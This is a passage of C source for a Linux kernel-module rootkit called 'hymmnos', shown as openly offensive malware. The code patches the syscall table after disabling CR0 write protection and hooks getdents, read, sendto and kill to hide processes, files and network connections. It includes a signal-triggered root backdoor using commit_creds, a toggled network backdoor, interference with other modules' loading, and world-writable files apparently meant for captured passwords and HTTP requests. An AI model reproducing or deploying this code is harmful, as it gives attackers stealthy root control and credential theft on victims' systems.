        printk(KERN_INFO "Processing the module: %s\n", module->name);

    spin_lock_irqsave(&module_notifier_spinlock, flags);
    switch (module->state)
    {
    case MODULE_STATE_COMING:
        if (DEBUG)
            printk(KERN_INFO "Replacing init and exit functions: %s.\n",
                   module->name);
        module->init = fake_init;
        module->exit = fake_exit;
        break;
    default:
        break;
    }
    spin_unlock_irqrestore(&module_notifier_spinlock, flags);

    return NOTIFY_DONE;
}

void regist_komon(void)
{
    if (is_komon != 0)
        return;
    is_komon = 1;
    register_module_notifier(&nb);
}

void unregist_komon(void)
{
    if (is_komon == 0)
        return;
    is_komon = 0;
    unregister_module_notifier(&nb);
}

//================================================

//for control and root backdoor
//===============================================

asmlinkage int new_sys_kill(pid_t pid, int sig)
{
    switch (sig)
    {
    case SIGHIDEHYMMNOS:
        if (hidden)
            show();
        else
            hide();
        break;
    case SIGHIDEPROC:
        if (is_pid_hidden((long)pid))
            make_pid_show((long)pid);
        else
            make_pid_hidden((long)pid);
        break;
    case SIGHIDECONTENT:
        if (hide_file_content)
            hide_file_content = 0;
        else
            hide_file_content = 1;
        break;
    case SIGROOT:
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
        current->uid = 0;
        current->suid = 0;
        current->euid = 0;
        current->gid = 0;
        current->egid = 0;
        current->fsuid = 0;
        current->fsgid = 0;
        cap_set_full(current->cap_effective);
        cap_set_full(current->cap_inheritable);
        cap_set_full(current->cap_permitted);
#else
        commit_creds(prepare_kernel_cred(0));
#endif
        break;
    case SIGBACKDOOR:
        if (is_net_backdoor)
            unregist_backdoor();
        else
            regist_backdoor();
        break;
    case SIGKOMON:
        if (is_komon)
            unregist_komon();
        else
            regist_komon();
        break;
    default:
        return ref_sys_kill(pid, sig);
    }
    return 0;
}

//===============================================

static unsigned long **acquire_sys_call_table(void)
{
    unsigned long int offset = (unsigned long int)sys_close;
    unsigned long **sct;

    if (DEBUG)
        printk(KERN_INFO "finding syscall table from: %p\n", (void *)offset);

    while (offset < ULLONG_MAX)
    {
        sct = (unsigned long **)offset;

        if (sct[__NR_close] == (unsigned long *)sys_close)
        {
            if (DEBUG)
                printk(KERN_INFO "sys call table found: %p\n", (void *)sct);
            return sct;
        }
        offset += sizeof(void *);
    }

    return NULL;
}

static void create_file(char *name)
{
    struct file *f;
    char *path;

    mode_t old_mask = xchg(&current->fs->umask, 0);

    path = kzalloc(strlen(name) + strlen(FILE_SUFFIX) + 1, GFP_KERNEL);

    if (!path)
        return;

    strcpy(path, name);
    strcat(path, FILE_SUFFIX);

    f = file_open(path, O_CREAT, 0777);
    if (f)
        file_close(f);

    kfree(path);

    xchg(&current->fs->umask, old_mask);
}

/* Creates files with permissions 777 used later by rootkit
 * because functions filp* worsk with privileges of user calling syscall
 * files:
 * /etc/passwords[FILE_SUFFIX]
 * /etc/http_requests[FILE_SUFFIX]
*/
static void create_files(void)
{
    create_file("/etc/http_requests");
    create_file("/etc/passwords");
}

#define register(name)                                     \
    ref_sys_##name = (void *)sys_call_table_[__NR_##name]; \
    sys_call_table_[__NR_##name] = (unsigned long *)new_sys_##name;

#define unregister(name) \
    sys_call_table_[__NR_##name] = (unsigned long *)ref_sys_##name;

static int __init rootkit_start(void)
{
    if (!(sys_call_table_ = acquire_sys_call_table()))
        return 0;

    create_files();

    ref_sys_readlink = (void *)sys_call_table_[__NR_readlink];
    ref_sys_open = (void *)sys_call_table_[__NR_open];

#if SYSCALL_MODIFY_METHOD == CR0
    original_cr0 = read_cr0();
    write_cr0(original_cr0 & ~0x00010000);
#endif
#if SYSCALL_MODIFY_METHOD == PAGE_RW
    make_rw((long unsigned int)sys_call_table_);
#endif

    register(getdents);
    register(getdents64);
    register(sendto);
    register(read);
    register(kill);
    set_afinfo_seq_op(show, "/proc/net/tcp", struct tcp_seq_afinfo,
                      new_seq_show, ref_seq_show);

#if SYSCALL_MODIFY_METHOD == CR0
    write_cr0(original_cr0);
#endif
#if SYSCALL_MODIFY_METHOD == PAGE_RW
    make_ro((long unsigned int)sys_call_table_);
#endif
    work_queue = create_workqueue(WORKNAME);
    regist_backdoor();
    regist_komon();

    return 0;
}

static void __exit rootkit_end(void)
{
    void *temp;
    if (!sys_call_table_)
        return;

#if SYSCALL_MODIFY_METHOD == CR0
    write_cr0(original_cr0 & ~0x00010000);
#endif
#if SYSCALL_MODIFY_METHOD == PAGE_RW
    make_rw((long unsigned int)sys_call_table_);
#endif

    unregister(getdents);
    unregister(getdents64);
    unregister(sendto);
    unregister(read);
    unregister(kill);

    set_afinfo_seq_op(show, "/proc/net/tcp", struct tcp_seq_afinfo,
                      ref_seq_show, temp);

#if SYSCALL_MODIFY_METHOD == CR0
    write_cr0(original_cr0);
#endif
#if SYSCALL_MODIFY_METHOD == PAGE_RW
    make_ro((long unsigned int)sys_call_table_);
#endif

    unregist_backdoor();
    flush_workqueue(work_queue);
    destroy_workqueue(work_queue);
    unregist_komon();

    clean_hidden_inodes();
    clean_hidden_pids();
}

module_init(rootkit_start);
module_exit(rootkit_end);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("f1ys0ar");
MODULE_DESCRIPTION("hymmnos - wuta wa inochi no tame");
